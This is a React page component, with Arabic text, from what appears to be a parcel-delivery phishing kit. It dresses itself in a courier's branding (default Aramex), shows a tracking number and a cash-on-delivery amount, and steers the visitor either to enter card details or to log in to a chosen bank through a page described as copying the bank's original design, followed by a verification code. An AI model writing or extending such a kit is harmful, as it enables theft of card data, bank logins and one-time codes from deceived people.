import { useEffect, useMemo, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode, formatCurrency } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import {
  CheckCircle2,
  CreditCard,
  LogIn,
  Hash,
  Truck,
  Building2,
  ShieldCheck,
} from "lucide-react";

type PaymentMethod = "card" | "login";

const PaymentTrackConfirm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading } = useLink(id);

  const [selectedMethod, setSelectedMethod] = useState<PaymentMethod | "">("");
  const [selectedBank, setSelectedBank] = useState<string>("");

  const countryCode = linkData?.country_code || "";
  const countryData = getCountryByCode(countryCode);

  const payload = linkData?.payload as Record<string, any> | undefined;
  const serviceKey = payload?.service_key || payload?.service || "aramex";
  const serviceName = payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const banks = useMemo<Bank[]>(() => getBanksByCountry(countryCode?.toUpperCase() || ""), [countryCode]);

  const codAmount = payload?.cod_amount ?? 0;

  useEffect(() => {
    const storedMethod = sessionStorage.getItem("paymentMethod") as PaymentMethod | null;
    const storedBank = sessionStorage.getItem("selectedBank") || "";

    const defaultMethod: PaymentMethod = (payload?.payment_method === "login" ? "login" : "card");

    if (storedMethod) {
      setSelectedMethod(storedMethod);
    } else if (payload?.selected_bank) {
      setSelectedMethod("login");
    } else {
      setSelectedMethod(defaultMethod);
    }

    if (storedBank) {
      setSelectedBank(storedBank);
    } else if (payload?.selected_bank) {
      setSelectedBank(payload.selected_bank);
    }
  }, [payload?.selected_bank, payload?.payment_method]);

  useEffect(() => {
    // Clear stale information when entering the flow fresh
    sessionStorage.removeItem("customerInfo");
    sessionStorage.removeItem("cardLast4");
    sessionStorage.removeItem("cardName");
    sessionStorage.removeItem("cardNumber");
    sessionStorage.removeItem("cardExpiry");
    sessionStorage.removeItem("cardCvv");
    sessionStorage.removeItem("cardType");
    sessionStorage.removeItem("bankLoginData");
  }, []);

  const handleContinue = () => {
    const method = (selectedMethod || (payload?.selected_bank ? "login" : "card")) as PaymentMethod;

    if (method === "login" && !selectedBank) {
      toast({
        title: "اختر البنك",
        description: "الرجاء تحديد البنك الذي ترغب بتسجيل الدخول إليه",
        variant: "destructive",
      });
      return;
    }

    sessionStorage.setItem("paymentMethod", method);
    sessionStorage.setItem("selectedCountry", countryCode || "");

    if (method === "login") {
      sessionStorage.setItem("selectedBank", selectedBank);
    } else {
      sessionStorage.setItem("selectedBank", "skipped");
    }

    navigate(`/pay/${id}/recipient`);
  };

  const methodCards = [
    {
      id: "card" as PaymentMethod,
      title: "تفاصيل البطاقة",
      description: "أدخل بيانات البطاقة بشكل آمن مع تأكيد عبر رمز التحقق",
      icon: <CreditCard className="w-5 h-5" />,
    },
    {
      id: "login" as PaymentMethod,
      title: "تسجيل الدخول البنكي",
      description: "سجّل دخولك للبنك بنفس تصميم الواجهة الأصلية ثم أدخل رمز التحقق",
      icon: <LogIn className="w-5 h-5" />,
    },
  ];

  const formattedAmount = countryData
    ? formatCurrency(codAmount, countryData.currency)
    : `${codAmount ?? 0}`;

  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="تتبع وتأكيد الدفع"
      description={`تأكد من تفاصيل الشحنة واختر طريقة الدفع المناسبة لخدمة ${serviceName}`}
      icon={<ShieldCheck className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      <div className="space-y-6">
        {/* Tracking & Summary */}
        <Card className="p-4 sm:p-5 border-dashed" style={{ borderColor: `${branding.colors.primary}40` }}>
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-3">
              <div
                className="w-12 h-12 rounded-xl flex items-center justify-center"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                }}
              >
                <Truck className="w-6 h-6 text-white" />
              </div>
              <div>
                <p className="text-sm text-muted-foreground">شركة الشحن</p>
                <p className="text-lg font-bold">{serviceName}</p>
              </div>
            </div>
            {countryData && (
              <Badge variant="secondary" className="text-sm">
                {countryData.flag} {countryData.nameAr}
              </Badge>
            )}
          </div>

          <div className="grid sm:grid-cols-2 gap-3 text-sm">
            {payload?.tracking_number && (
              <div className="flex items-center gap-2">
                <Hash className="w-4 h-4 text-muted-foreground" />
                <span className="text-muted-foreground">رقم التتبع:</span>
                <span className="font-semibold">{payload.tracking_number}</span>
              </div>
            )}
            {payload?.package_description && (
              <div className="flex items-center gap-2">
                <Truck className="w-4 h-4 text-muted-foreground" />
                <span className="text-muted-foreground">وصف الطرد:</span>
                <span className="font-semibold">{payload.package_description}</span>
              </div>
            )}
            <div className="flex items-center gap-2">
              <CreditCard className="w-4 h-4 text-muted-foreground" />
              <span className="text-muted-foreground">المبلغ المستحق:</span>
              <span
                className="font-bold"
                style={{ color: branding.colors.primary }}
              >
                {formattedAmount}
              </span>
            </div>
          </div>
        </Card>

        {/* Method selection */}
        <div>
          <h2 className="text-base sm:text-lg font-semibold mb-3">اختر طريقة إكمال الدفع</h2>
          <div className="grid sm:grid-cols-2 gap-3">
            {methodCards.map((method) => {
              const isSelected = selectedMethod === method.id;
              return (
                <Card
                  key={method.id}
                  role="button"
                  tabIndex={0}
                  onClick={() => setSelectedMethod(method.id)}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" || e.key === " ") {
                      e.preventDefault();
                      setSelectedMethod(method.id);
                    }
                  }}
                  className={`p-4 transition-all cursor-pointer border-2 ${
                    isSelected
                      ? "shadow-lg"
                      : "hover:border-muted-foreground/40"
                  }`}
                  style={{
                    borderColor: isSelected ? branding.colors.primary : undefined,
                    background: isSelected
                      ? `${branding.colors.primary}10`
                      : undefined,
                  }}
                >
                  <div className="flex items-start gap-3">
                    <div
                      className="w-10 h-10 rounded-lg flex items-center justify-center"
                      style={{
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                        color: "#fff",
                      }}
                    >
                      {method.icon}
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center gap-2">
                        <p className="font-semibold text-base">{method.title}</p>
                        {selectedMethod === method.id && (
                          <CheckCircle2 className="w-5 h-5" style={{ color: branding.colors.primary }} />
                        )}
                      </div>
                      <p className="text-sm text-muted-foreground leading-relaxed">
                        {method.description}
                      </p>
                    </div>
                  </div>
                </Card>
              );
            })}
          </div>
        </div>

        {/* Bank selector when login method chosen */}
        {(selectedMethod === "login" || (!selectedMethod && payload?.selected_bank)) && (
          <div className="space-y-3">
            <h3 className="text-base font-semibold">اختر البنك الذي تريد تسجيل الدخول إليه</h3>
            {banks.length === 0 ? (
              <Card className="p-4 text-center text-sm text-muted-foreground">
                لا توجد بنوك متاحة لهذه الدولة حالياً. الرجاء اختيار طريقة الدفع بالبطاقة.
              </Card>
            ) : (
              <div className="grid sm:grid-cols-2 gap-3">
                {banks.map((bank) => {
                  const isActive = selectedBank === bank.id;
                  return (
                    <Card
                      key={bank.id}
                      role="button"
                      tabIndex={0}
                      onClick={() => {
                        setSelectedMethod("login");
                        setSelectedBank(bank.id);
                      }}
                      onKeyDown={(e) => {
                        if (e.key === "Enter" || e.key === " ") {
                          e.preventDefault();
                          setSelectedMethod("login");
                          setSelectedBank(bank.id);
                        }
                      }}
                      className={`p-4 border-2 transition-all cursor-pointer ${
                        isActive ? "shadow-lg" : "hover:border-muted-foreground/40"
                      }`}
                      style={{
                        borderColor: isActive ? bank.color || branding.colors.primary : undefined,
                        background: isActive ? `${bank.color || branding.colors.primary}12` : undefined,
                      }}
                    >
                      <div className="flex items-center gap-3">
                        <div
                          className="w-10 h-10 rounded-full flex items-center justify-center text-white text-sm font-semibold"
                          style={{
                            background: bank.color || branding.colors.primary,
                          }}
                        >
                          <Building2 className="w-5 h-5" />
                        </div>
                        <div className="flex-1">
                          <p className="font-semibold text-sm">{bank.nameAr}</p>
                          <p className="text-xs text-muted-foreground">{bank.name}</p>
                        </div>
                        {isActive && (
                          <CheckCircle2 className="w-5 h-5" style={{ color: bank.color || branding.colors.primary }} />
                        )}
                      </div>
                    </Card>
                  );
                })}
              </div>
            )}
          </div>
        )}

        <div className="flex flex-col sm:flex-row items-center gap-3 sm:gap-4">
          <Button
            onClick={handleContinue}
            size="lg"
            className="w-full sm:flex-1 text-white"
            style={{
              background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
            }}
            disabled={isLoading}
          >
            متابعة
          </Button>
          <Button
            variant="ghost"
            className="w-full sm:w-auto"
            onClick={() => navigate(-1)}
          >
            رجوع
          </Button>
        </div>
      </div>
    </DynamicPaymentLayout>
  );
};

export default PaymentTrackConfirm;
